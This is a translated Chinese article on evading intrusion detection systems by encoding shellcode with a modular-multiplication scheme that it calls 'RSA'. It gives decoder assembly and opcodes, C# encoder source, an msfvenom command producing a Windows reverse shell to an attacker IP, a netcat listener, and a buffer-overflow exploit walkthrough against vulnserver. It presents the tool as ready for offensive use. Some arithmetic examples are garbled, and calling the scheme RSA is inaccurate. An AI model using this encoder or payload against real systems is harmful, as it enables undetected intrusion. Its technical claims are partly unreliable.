
# 【技术分享】智能逃避IDS——RSA非对称多态SHELLCODE


                                阅读量   
                                **93686**
                            
                        |
                        
                                                                                                                                    ![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            





[![](./img/85711/t0188c4ed59bb43fb58.png)](./img/85711/t0188c4ed59bb43fb58.png)

翻译：[华为未然实验室](http://bobao.360.cn/member/contribute?uid=2794169747)

稿费：200RMB（不服你也来投稿啊！）

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

**前言**

防火墙和入侵检测系统(IDS)是任何公司安全方面或组织内网络基础设施的基本核心。防火墙以网络信息为基础过滤流量，而IDS进行的是更深入的研究——考虑并分析在网络中循环的每个数据包的实际数据的内容。

要真正评估网络上的数据包，IDS需要在非常低的级别上理解在特定协议内循环的信息的类型。因此，入侵检测系统(IDS)是分析系统和网络活动，以检测是否有未授权进入和/或恶意活动的活动进程或设备。

市场上的IDS产品琳琅满目。1998年，Ptecek和Newsham演示了如何逃避IDS，他们使用了多种技术，比如重叠shellcode片段、包封数字序列及在漏洞利用的有效载荷中插入随机数据包。这些技术在当时是可行的，因为彼时IDS处理或解释数据包的方式与网络专有系统不同。

在解释本文提出的逃避IDS的具体方式之前，我们先简要介绍一下IDS的基本操作。IDS基本模式如下（各IDS不尽相同）：

1. 嗅探器读取以混杂模式连接到交换机、路由器、集线器等的镜像接口的接口的所有流量。如为嵌入式安装设备，则直接采用镜像接口本身。

2. 一些预处理器处理由嗅探器读取的数据，然后由规则引擎更快地处理。此外还有其他功能，比如尽量使攻击者无法规避规则引擎，我们稍后将讨论这一点。

3. 引擎规则和一组规则。从预处理器处理的数据包，引擎规则通过寻找与其中一个规则匹配的攻击模式传递由每一个规则处理的数据包。如果匹配，则执行规则指示的操作，通常将其视作攻击（接受）或拒绝数据包（丢弃，传递，拒绝…）。如果是确认的攻击，则通知后处理器。

4. 后处理器负责处理攻击，即通过电子邮件通知攻击、以纯文本或在数据库中存储攻击、阻止攻击（在这种情况下，IDS是入侵防御系统IPS），等等。

在网络层面从全局角度解释了IDS的操作后，我们接下来简要解释一下用于逃避这些系统的可能的攻击途径。攻击途径主要有四种，还有一种虽然不是攻击途径，但作为IDS的限制，也需要介绍：

通过预处理器中的碎片包来逃避。在该攻击途径中有两种可能的逃避。

攻击中使用的编码。并非所有IDS都支持相同类型的编码（支持受攻击的服务）。

蠕虫多态性和变质（多态性和变质蠕虫）。

由预处理器处理的输入数据（不正确）解析，这可能导致拒绝服务并因此导致IDS的失效。

加密通信。虽然事实上这不是攻击途径，但必须加以考虑。如果攻击者和服务器受害者之间的通信被加密，则IDS不能识别任何攻击模式，这无需多言。事实上，通信被加密的原因是没有中介元素可以理解它们之间的数据。

传统类型的IDS逃避的问题恰恰是完全了解其基础和TCP / UDP水平上这些变化的确定性。操作码水平上的对称加密便由此出现，即传统的多态性——并不总是起作用。有些公司，作为其特定目的，在模块IDS的分析引擎中进行检测。不仅考虑上述方法，而且作为主要核心的一部分，在执行的流程中考虑不同语言的脚本的聚合，这使系统管理员或安全专家可基于具体产品的嵌入式API在全部流上添加ACLS。如果可能添加启发式分析，则总结对系统的恶意攻击的检测。

因此我们需要一种更强大的方法来帮助智能逃避IDS。本文重点介绍如何通过使用Shellcode（通过网络发送）的非对称加密的RSA实现来实现这一点。因此我们要描述一种多态shellcode的实现的新思想。在利用过程中，对于对于真正参与开发、检测及遏制攻击到低水平的计算机安全专业人员而言，这反过来可以作为保护和/或攻击的模式。

缩减形式的RSA将被用作加密方法——将用于逃避IDS。注意，这是一个新的实现，仍需要改进。下面将详细解释如何使用提出的RSA算法执行shellcode的加密和解密。

多态shellcode的基本概念是，在利用漏洞期间，当利用代码通过网络发送shellcode时，该操作码链被NIDS检测到。本文描述的建议是使用RSA算法来加密这个链，因为是非对称算法，所以结果字符串不会有任何相干性或逻辑，因此IDS不会知道其是一个shellcode。字符串将具有以下结构：

1. 用于解密字符串的操作码

2. 由RSA算法加密的操作码

在本文中，我们将解释完整的想法和执行的测试，将按以下顺序进行解释：

1. 如何加密和解密shellcode的操作码

2. 如何构建解密shellcode的程序，以及如何获取操作码

3. 如何构建能够加密操作码（C＃.NET）的程序

4. 用于验证所有算法有效而执行的本地测试

5. 用于验证算法对于真正的远程利用代码确实有效而执行的远程测试

<br>

**加密和解密操作码的算法**

由于RSA已经是一个众所周知的算法，所以本文档的目的不是解释或执行其演示。以下是我们将以缩减形式使用的公式：

**加密：**F(m, e) = me mod n = n = c，其中m是消息，e是公钥，c是密码。

**解密：**F(c, d) = cd mod n = m

n = p x q，p、q = 2个数字素数

以下是如何加密shellcode的解释：

将把2个素数作为基础来执行加密，要注意，这可能因加密类型的不同而各异。我们将数字3作为公钥，将171作为私钥（两者均为素数），模块256的方式是，加密数字是乘以3，取模块256时我们只取两个最低有效字节。要解密，一个数字必须乘以171，并以同样方式只取两个最低有效字节，例如：

现在我们将使用缩减的RSA加密下一个链：xebx45c9

将由“ x”（每个操作码）分隔的每对数字乘以3，且只应取前2个最低有效字节：

xeb–&gt;0xeb*0x3=0x2c1因此加密的号码是： xc1

x45–&gt;0xeb*0x3=0xcf因此加密的号码是： xcf

xc9–&gt;0xeb*0x3=0x25b因此加密的号码是： x5b

因为密码模块是256，所以取2个最低有效位作为最终编码的号码。这样我们可以得出结论，加密等式如下：

```
A = 3(n)mod 256
```

其中，

A = 密码号

3 =公钥

破译的解释如下：

密码号： xc1 Decrypting 0xc1*0xab=0x80eb解密的号码是：xeb

密码号： xcf Decrypting 0xcf*0xab=0x8A45解密的号码是： x45

密码号： x5b Decrypting 0x5b*0xab=0x3cc9解密的号码是： xc9

对于解密，数字乘以ab，因为171是十六进制的AB，正如我们在加密中所执行的，对于最终数字，解密取2个最低有效位。

```
B = 171(n) mod 256
```

其中，

B = 解密的数字

171 = 私钥

<br>

**解密程序**

解释了shellcode的加密如何工作后，我们继续执行程序，在运行时执行指令来解密每个操作码。这是本文中最精妙的部分，获得Shell加密后（我们将在下一点解释如何自动加密所有shellcode），我们就必须执行能够直接在堆栈上解密它的程序。这应该用汇编程序编写，因为将在那里（在堆栈中）执行，因此在汇编程序中开发了以下程序：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t015f8e8096017b09a3.png)

我们将进行通俗的解释，以便于理解。在上面的程序中执行的第一个动作是跳转到标签“three”，其将执行语句“call one”，这个动作保存返回地址，其将跳转到标签“one”。此地址放在注册表“esi”中，这是以前保存的地址。在随后的三行中，记录“ecx”、“eax”及“ebx”被清除，随后其当前内容将为：0x0000000。现在其被放在注册表“CL”中（数字33），这表示我们的shellcode加密的字节大小。这个例子中是33（必须针对每个shellcode更改该数字，因为每个的长度各异），现在其将被放置在寄存器“al”（解密的位置的值），这是通过用计数器“ecx”（其保存shellcode加密的长度）添加“esi”（其包含shellcode加密的原理）的地址来实现的。应该解释的是，每个操作码的解密根据所建立的技术从下到上执行。

再次谈谈算法，在第一次运行时，程序将待解密的链编码的最后一个操作码的值放入寄存器“al”中，然后减1。为此，“CL”中的初始值必须始终至少大3个单位（以确保所有shellcode将被解密），然后，其被放置在寄存器ebx的下部，即B1，数字171，其将乘以放置在标签“four”下的shellcode加密（这是用于解密）的每个数字，然后将“bl”的内容乘以“a1”，结果放在“eax”中，我们要查找的值（两个最低有效字节）在“al”（eax的下部）中，为此，我们将“al”的内容放在当前位置：[esi ecx – 1]，被计数器（cl）递减一，并且被验证：如果不为零，则返回到标签“two”，否则继续执行程序，下一步是跳转标签“four”，这正是找到现在解密的shellcode的地方。

在算法的这一点的重要方面是理解循环——被执行以减少在堆栈内的位置：其从加密的shellcode的末尾开始执行，直到标签“4”之前的1位置，每个交互执行操作以进行解密并用新值重写位置。

我们获得汇编器中的程序后，我们必须获取操作码——用于nasm，程序首先在汇编器中编译，如下所示：

```
$ nasm muldescrifra.asm
```

然后被反汇编：

```
$ ndisasm muldescrifra
```

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014064e4a9c9277e52.png)

我们以这种方式获得主操作码（第二列），必须强调的是，在这部分中有“脏”代码，因为值66和67应该从最终字符串中删除，并根据新的值修改跳转，链用操作码完成：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d5a4ca1de469b8b7.png)

<br>

**优化操作码**

当我们执行程序的正常写入并以这种方式编译时，我们获得的是已经提到的垃圾操作码，例如：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01cedabd1104e53211.png)

操作码66和67表示确定最终字符串的长度和跳转地址的垃圾操作码，这产生问题，有必要重新计算长度。这些操作码应该被省略。为此，我们必须将header [BITS 32]添加到ASM程序的文件中，这样当解密完成时，这些操作码被省略：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a590e0b4aa18e206.png)

第一版本中的加密程序具有存储shellcode的大小的限制。根据程序的设计，十六进制的这个数字存储在ECX（计数器）的下部，即在CL中。这里明显可以看到限制，因为你可以存储的最大数字是FF，即255个字符，因为其只使用16位。在下面的加密程序代码中可以看到这个事实：



```
xor ecx,ecx
mov cl,33
```

当加密的shellcode的有效载荷具有多于255个操作码时，该限制完全暴露，该限制在任何反向shellcode上非常普遍，原因是其数量大于255个操作码。为解决这个限制，使用了所有的ECX寄存器。

下面是ASM上的数据寄存器的结构：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013a302e798ee37bf1.png)

为此，有必要使用所有的ECX寄存器来分配shellcode的总长度。程序如下：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t015d18706c0843217d.png)

所做的基本改变是使用ECX寄存器的高部，由以下两行中的CX表示：



```
mov cx,376
sub cx,1
```

做出这一改变后，这便是我们在堆栈中的新位置：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01533b99ceaafb8664.png)

重要的一行是：

```
00000009 66B978018A44      mov ecx,0x448a0178
```

其中可以看出，值378以32位格式成功分配。这样，密码程序已经能够处理大shellcode，字符多达32位许可证。

<br>

**加密程序**

对于加密程序的实现，我们选择了C＃.NET，因为其具有可移植性且代码易于理解，这方便算法的解释。对于程序的阐述，我们不提供所有代码，而是将展示和解释加密的重要部分。

该程序在主表单的2个类中执行，主类负责加密、读取和操作码结束的暴露，另一个类只负责获取十六进制数。负责转换为十六进制的类如下所示：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018d1cfbc63cc890f0.png)

其是一个小类，已声明为静态，以便随时访问ToHexString方法，此方法执行到十六进制的转换，并返回作为类型字符串转换的数字。这是程序的核心，加密和最终链在此完成：



```
private void button1_Click(object sender, EventArgs e)
{
string[] cShellcode = { "\xEB", "\x1C", "\x5E", "\x31", "\xC9", "\x31", "\xC0",
"\x31", "\xDB", "\xB1", "\x00", "\x8A", "\x44", "\x0E", "\xFF", "\xB3", "\xAB", "\xF6",
"\xE3", "\x88", "\x44", "\x0E", "\xFF", "\x80", "\xE9", "\x01", "\x75", "\xEF", "\xEB",
"\x05", "\xE8", "\xDF", "\xFF", "\xFF", "\xFF" };
richTextBox2.Clear();
string [] separadores = { "/x","\x" };
string shellcodeOri = richTextBox1.Text.Replace(""","");
string[] opcodes = shellcodeOri.Split(separadores,
System.StringSplitOptions.RemoveEmptyEntries);
string[] opcodesInterno=new string[opcodes.Length];
decimal tamShellcode = (decimal)(opcodes.Length + 25);
cShellcode[10] = "\x" + tamShellcode.ToHexString().ToString();
int contador = 0;
int contador1 = 0;
int contador2 = 0;
if (cifrador == 1)
{
richTextBox2.Text = "//************RSA DECODER************" + "n";
foreach (string j in cShellcode)
{
if (contador1 == 10)
{
richTextBox2.Text += "n";
contador1 = 0;
}
richTextBox2.Text += j;
contador1++;
}
richTextBox2.Text += "n//********ENCODED SHELLCODE*********" + "n";
}
foreach (string s in opcodes)
{
//MessageBox.Show(System.Convert.ToDecimal(s).ToString());
try
{
decimal opc = int.Parse(s, System.Globalization.NumberStyles.HexNumber) *
usePrime; // System.Convert.ToDecimal(s) * 3;
opc = opc % useModule;
var hex = opc.ToHexString();
if (hex.ToString().Length == 1)
{
opcodesInterno[contador] = "\x0" + hex.ToString();
}
else
{
opcodesInterno[contador] = "\x" + hex.ToString();
}
//MessageBox.Show(opcodesInterno[contador]);
contador++;
}
catch (Exception ex) { MessageBox.Show(ex.ToString()); }
}
foreach (string s2 in opcodesInterno)
{
try
{
if (contador2 == 10)
{
richTextBox2.Text += "n";
contador2 = 0;
}
richTextBox2.Text += s2.ToString();
contador2++;
}
catch { MessageBox.Show("Formato de Opcodes Incorrecto"); }
}
textBox1.Text = opcodes.Length.ToString();
textBox2.Text = opcodesInterno.Length.ToString();
Array.Clear(opcodes, 0, opcodes.Length);
Array.Clear(opcodesInterno, 0, opcodesInterno.Length);
decimal temp = (decimal)usePrime;
textBox3.Text = "DEC: "+usePrime.ToString() + "|| HEX:" +
temp.ToHexString().ToString(); ;
textBox5.Text = useModule.ToString();
}
```

首先，我们声明一个表示加密算法的字符串变量，还声明了分隔符的排列，这些分隔符随后将用于清除在RichBox类型的组件中输入的链。读取此组件并清除表示要加密的操作码的初始字符串：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t010941a22966a6c8f6.png)

C＃.Net有一个友好的框架，因此输入的读取易于执行，读取输入到主RichBox中的内容在单行进行，然后在检测到onClick事件时解析和清除：



```
string shellcodeOri = richTextBox1.Text.Replace(""","");
string[] opcodes = shellcodeOri.Split(separadores, System.StringSplitOptions.RemoveEmptyEntries);
```

可以看到，richbox组件的名称为richBox1：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t018cadbca7e8b5080b.png)

方法Replace被调用，其包含在空间Text中，并且重载了用于填充新的排列类型字符串（2×2）和将包含要加密的shellcode的间隔符。

另一点要强调的是类型decimal的变量，其表示原始shellcode的大小，即单独表示操作码的对的数目，分配了25的偏移，即多25个位置，以确保解密算法将应用整个shellcode。随后将打印最终字符串：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01242a551325bbbc70.png)

变量“cifrador”是允许程序决定是否打印密码的指示。其是在程序开始时声明的静态变量：“public static int encryptor;” 且在主程序的加载事件期间被初始化为构造器结构：



```
public Form1()
{
InitializeComponent();
usePrime = 3;
useModule = 256;
cifrador = 1;
}
```

此变量使用值1初始化，因此默认情况下将一次打印一个加密代码，有可能观察到集成if结构的“foreach”。在代码的下一部分中，存在核心功能的主要部分，即每个操作码由指定的素数加密：<br>

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0198e2a7871a8135f2.png)

变量“usePrime”是从Form2提取的变量，其指定执行加密要乘以的素数：

```
decimal opc = int.Parse(s, System.Globalization.NumberStyles.HexNumber) * usePrime;
```

正是在这一点上，程序加密每个操作码，最终得到模块：opc = opc％useModule；变量“useModule”也被导出，结果保存在数组：opcodesInterno []中。

最后打印已经加密的最终字符串，其将在加密代码后立即打印：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01407dc265bb6777a7.png)

打印该链的重点是位置编号11。我们在ASM中的程序创建中进行了回顾，位置11表示要加密的shellcode的大小，因此被替换为操作码10（由于第一个元素为0），如下所示：

```
cShellcode[10] = "\x" + tamShellcode.ToHexString().ToString();
```

以这种方式得出加密主引擎结论。程序还有第二种形式，其允许选择选项并提供给这个程序。套件的功能是使用不同的数字对来加密shellcode，这也包括2个类，其中1个用于生成素数。主类负责收集在主Form中用于加密的数据。以下是第一个类：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e77ca9c633833b6c.png)

前面的代码验证数字是否为素数。类也被声明为静态，以便使用主方法“isPrime”从任何点访问它，如果数字是素数，则返回true，如果不是，则返回false。第二个类是主体，有几个方法，主要的一个允许选择素数，并且通过用前100个素数填充ComboBox来实现：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014a9fd0dcf202aec2.png)

第二种方法是使用主按钮的onClick事件启动，其负责将选择发送到上述主Form：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t015f6c065b91f0ca96.png)

程序编译后，结果如下：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01cf161853ad13fa83.png)

我们可以看到，程序将加密代码放在首位，随后是加密的shellcode，有可能直接从文本文件上传程序：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01976f031dee3fe7ad.png)

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015e803c50fadeaa01.png)

素数的选择必须链接到先前选择的也是素数的数字，两者表示密钥对（公钥和私钥），因此，RSA算法的实现是成功的。程序的主引擎不使用本机Windows API（因此其从头开始实现转换为十六进制），这个多态性shellcode RSA的套件生成器能够在Linux上运行、能使用wine，这使它具有多平台的能力：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01fcfc6ddb7d3f78a9.png)

这个版本可以使用了，我们只需要指定我们想要的shellcode、素数对及模块（默认为256），点击“Encode”，最后的链将显示在称为“Shellcode Encoded”的字段中。此链可以插入一个偏移量为3个空字符的利用代码中，以确保整个shellcode的解密。

<br>

**多态 RSA SHELLCODE的本地测试**

在这一点上，我们已经拥有执行第一次本地测试的两个关键点：

1. 由opcodes表示的加密算法准备好与真正的shellcode工作

2. 能够非对称加密每个操作码的程序

我们使用没有大小限制的版本进行本地测试。我们将使用以下表示加密的shellcode并加密到32位的字符串：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0172d91c3a8a774775.png)

这是我们将使用的用于查看堆栈的状态的源代码，写在C上：



```
int main()
{
printf("Shellcode Length: %dn", (int)strlen(code));
int (*ret)() = (int(*)())code;
ret();
}
```

在编译并加载到GDB之后，以下是堆栈的状态：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0137841db211ed06b1.png)

可以看到，从地址0到31是解密，然后从33是加密的shellcode，此时不具有任何一致性。为了在shellcode解密后执行完成前查看堆栈的状态，我们将在shellcode加密中在末尾更改操作码的内容。这将导致运行时错误，但我们将获得堆栈的状态。出现该错误之前，预期可以看到彼时shellcode如何被破译，具有shellcode "wrong"的程序如下：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01eaa63e862eed0322.png)

更改的值为“9A”，程序被编译：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ec291a35cd37bb5a.png)

由于所做的更改，其执行不成功，以下显示的是运行二进制文件前的调试会话，注意堆栈有shellcode密码：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01391ebd4a8f94043a.png)

二进制被执行，我们可以观察到栈从+38行开始

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017dbef0fa432e4fb9.png)

可以看到，shellcode被成功解密，并停在点81，这正是我们改变操作码来实现这个目的的点，现在只需修正更改的操作码，观察到shell被正确执行：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t019b87f614ec860340.png)

结果是一个Shell，表示其已经成功地在运行时实现了解密的代码。

<br>

**多态性执行的远程测试**

为了演示该算法的完整功能和其在真正脆弱的系统上的实现，首先，我们需要检测有漏洞应用程序，然后执行利用代码。为此，采用了一个称为vulnserver.exe的应用程序服务器，这是一个监听端口9999并在Windows中默认运行的服务器，已在Windows 7中实现，服务器的IP是192.168.1.76，并有 以下选项：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0180a8e0a89749b11a.png)

每次服务器接收到连接时，显示已成功建立：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t017c742063ca6b1899.png)

服务器有一个当时被利用的缓冲区溢出。一旦建立连接，将发送最多5000个字符的字符串。为了测试是否充分利用，我们运行以下用python编写脚本：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b5dca5785e3a921b.png)

程序建立连接并发送50000次字符“A”，导致了缓冲区溢出。这在服务器中以以下方式表现：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t014d38d0501b2f8cce.png)

所以，知道服务器有一个缓冲区溢出后，开发了利用代码，以下是具有正确跳转地址的利用代码：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e37935594ecee774.png)

现在有必要添加将被注入到远程系统的shellcode。这是整个过程的微妙部分。生成shellcode必须遵循基本的攻击规则，这不是在本地执行shell，而是由特定端口在攻击者的机器中接收它。为了实现这一点，我们将使用Kali。重要的是要强调，由于使用反向shell，攻击者机器的IP是非常重要的，在这种情况下，攻击者机器的IP是192.168.1.93，反向shell是防火墙的真正专业实现的示例，其中其阻止不在白名单中的任何其他端口，但忽略了不同端口的绑定，本例中为4444：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01aa5eb00f4de424db.png)

这是将要使用的连接类型——反向Shell。以这样的方式，用于生成此类型的shellcode的命令如下：



```
root@kali:~# msfvenom -a x86 –platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.93 LPORT=4444 -e
x86/shikata_ga_nai -b ‘x00’ -f python
```

在这一点上要强调的要点是选项-b  x00，其告诉msfvenom的引擎避免这个操作码，因为如果接收到这个操作码，shellcode会突然结束而不继续运行其余的指令。此命令输出特定于此攻击者的shellcode，如下所示：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c35e0b6965712d84.png)

这个shellcode将被直接复制到exploit中，如下所示：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01115909a059a8675b.png)

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019b14dbdc5a6f285f.png)

完成此项后，在运行之前，我们将需要一个服务器监听端口4444。为了接收连接，使用netcat（nc – nvlp 4444）。我们运行利用代码，应该会在netcat的会话中得到一个shell。这是我们运行利用代码之前的会话：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d95639410b041e11.png)

可以观察到，netcat正在监听端口4444，并且利用代码尚未执行，现在，当我们运行利用代码，会发生以下情况：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b3591ef6c5cfd72e.png)

我们可以看到，利用代码在处于监听状态的会话中没有产生任何错误。我们在具有有漏洞的服务器用户所有者的执行权限的Windows系统上有一个直接shell。可以看到，在Windows会话中硬盘驱动器是C，这表明入侵已成功。服务器状态保持稳定，即尽管有BoF，仍继续正确操作，指示ASM级别没有检测到问题，执行shellcode并将其发送到指定端口指定的IP地址：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0109626877aa19aa01.png)

这表明远程Windows利用代码是完全成功的。

现在我们有了在利用代码中测试RSA非对称算法加密的所有元素。此时，现在唯一要做的是使用具有数字3和171的加密程序，并将其放入利用代码中。现在我们将加密原始的shellcode：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0160d539a39ca17073.png)

完成此项后，我们将具有加密的shellcode的最终字符串复制到最终利用代码中：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0132f298ef672b8701.png)

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0136ac056f426bd32d.png)



```
expl.send(buffer)
expl.close()
```

可以观察到，操作码不表示入侵检测系统（IDS / IPS）的任何东西，是不相干的操作码，因为其被加密了。以下是执行之前和之后：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t018afe591948bc69bf.png)

表示加密或解密的操作码，加密的操作码被分离。将根据在解密的程序中指定的跳跃来保存地址，以获得堆栈的增长和EIP的存储器中的位置：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01f28116c5b82c7392.png)

解释上面的内容后，我们将展示执行具有非对称多态Shellcode的利用代码前的会话：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01db55ba73fbe5eb06.png)

服务器正在运行和调试：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a356e9905d451f5c.png)

现在让我们执行远程利用代码。预期的结果正是，在堆栈中运行时解码每个操作码之后，获得反向shell：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d32017830709efc5.png)

执行成功，我们可以看到，代表利用代码的脚本的顶部已经被执行，在Netcat会话中，成功地从被攻破的机器接收到远程shell。我们可以在Linux会话上看到硬盘驱动器上的标签，除了一个简单和正常的连接之外，服务器没有注意到任何异常：

[![](./img/85711/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01858b64769a701395.png)

由此证明了算法作为应用程序的功能，其能够使用RSA加密来对操作码进行加密，这产生多态非对称shellcode——可在本地和远程利用代码中使用。

<br>

**结论**

本文介绍了用于加密shellcode的RSA算法、其在实际利用代码中的使用、代表前述算法的操作码的优化及用于加密的程序，我们得出的结论是，基于获得的和证明的结果，其提供了该建议的有效性的优异结果。基于RSA算法的多态性根本不影响注入到利用代码的恶意有效载荷的最终执行，IDS根本无法检测到它。

要强调的一个重要方面是，本研究的重点完全是攻击性的，但内在的、附带的结果是防御。加密算法还可以用于测试IDS或IPS，因此提供了一种以理想情况下入侵者所采用的方式执行测试的工具（修改利用代码和完成shellcoding）。

我们得出的另外一个结论是，这不仅开发了一种用于零日攻击和逃避NIDS的算法和工具，还提供了一种可以考虑的防御方法及相应的测试环境。
